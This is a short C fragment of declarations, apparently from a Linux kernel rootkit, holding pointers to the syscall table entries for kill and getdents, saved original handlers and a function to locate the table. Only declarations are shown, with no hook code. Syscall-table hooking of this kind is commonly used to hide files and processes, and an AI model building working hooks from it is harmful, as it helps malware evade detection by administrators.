

uint64_t ** syscall_table_kill;
void * orig_kill;
uint64_t ** syscall_table_dirent;
void * orig_dirent;

void get_syscall_table_ptrs(void);